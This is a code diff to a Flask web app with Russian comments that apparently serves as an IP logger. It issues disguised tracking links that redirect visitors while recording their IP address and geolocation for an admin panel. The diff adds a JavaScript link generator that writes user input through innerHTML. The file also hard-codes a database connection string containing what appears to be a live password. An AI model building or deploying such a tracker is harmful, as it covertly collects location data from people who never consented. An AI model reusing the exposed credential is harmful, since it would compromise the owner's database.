@@ -10,7 +10,7 @@ app = Flask(__name__)
 # Целевая ссылка по умолчанию
 DEFAULT_TARGET_URL = "https://2gis.ru"
 
-# ⚠️ ЗАМЕНИ ЭТУ СТРОКУ НА СВОЮ ИЗ NEON (с sslmode=require)
+# ⚠️ ЗАМЕНИ ЭТУ СТРОКУ НА СВОЮ ИЗ NEON (обязательно с sslmode=require)
 DATABASE_URL = "postgresql://neondb_owner:npg_Afov3TP1JjsI@ep-shy-pine-ahtyw75v-pooler.c-3.us-east-1.aws.neon.tech/neondb?sslmode=require&channel_binding=require"
 
 def init_db():
@@ -51,7 +51,7 @@ def get_geo_info(ip):
                 "latitude": lat,
                 "longitude": lon
             }
-    except Exception as e:
+    except Exception:
         pass
     return {"country": "Unknown", "country_code": "xx", "city": "Unknown", "latitude": 0.0, "longitude": 0.0}
 
@@ -130,8 +130,10 @@ def admin_panel():
             .time { color: #7f8c8d; font-size: 0.9em; }
             .link { color: #3498db; text-decoration: underline; }
             input[type="text"] { padding: 8px; width: 100%; max-width: 500px; margin: 5px 0; box-sizing: border-box; }
-            input[type="submit"] { padding: 8px 16px; background: #3498db; color: white; border: none; cursor: pointer; margin-top: 10px; }
-            input[type="submit"]:hover { background: #2980b9; }
+            button { padding: 8px 16px; background: #3498db; color: white; border: none; cursor: pointer; margin-top: 10px; }
+            button:hover { background: #2980b9; }
+            #generated_link { margin-top: 15px; font-weight: bold; word-break: break-all; }
+            code { background: #eee; padding: 2px 6px; border-radius: 4px; }
         </style>
     </head>
     <body>
@@ -172,13 +174,28 @@ def admin_panel():
         </table>
 
         <h2>🔗 Генератор трекер-ссылок</h2>
-        <form method="GET" action="/track">
-            <label for="url">Введите целевую ссылку:</label><br>
-            <input type="text" id="url" name="url" value="https://google.com" required>
+        <div>
+            <label for="target_url">Введите целевую ссылку:</label><br>
+            <input type="text" id="target_url" value="https://google.com" required>
             <br>
-            <input type="submit" value="Получить трекер-ссылку">
-        </form>
-        <p>Пример: <code>https://ip-tracker-ijlf.onrender.com/track?url=ВАША_ССЫЛКА</code></p>
+            <button type="button" onclick="generateLink()">Получить трекер-ссылку</button>
+        </div>
+        <p id="generated_link"></p>
+
+        <script>
+            function generateLink() {
+                const baseUrl = "https://ip-tracker-ijlf.onrender.com/track";
+                const targetUrl = document.getElementById("target_url").value.trim();
+                if (!targetUrl) {
+                    alert("Введите ссылку!");
+                    return;
+                }
+                const encodedUrl = encodeURIComponent(targetUrl);
+                const trackerLink = `${baseUrl}?url=${encodedUrl}`;
+                document.getElementById("generated_link").innerHTML = 
+                    `Готово! Скопируйте ссылку:<br><code>${trackerLink}</code>`;
+            }
+        </script>
     </body>
     </html>
     '''
@@ -275,4 +292,3 @@ if __name__ == '__main__':
     init_db()
     port = int(os.environ.get("PORT", 10000))
     app.run(host='0.0.0.0', port=port)
-
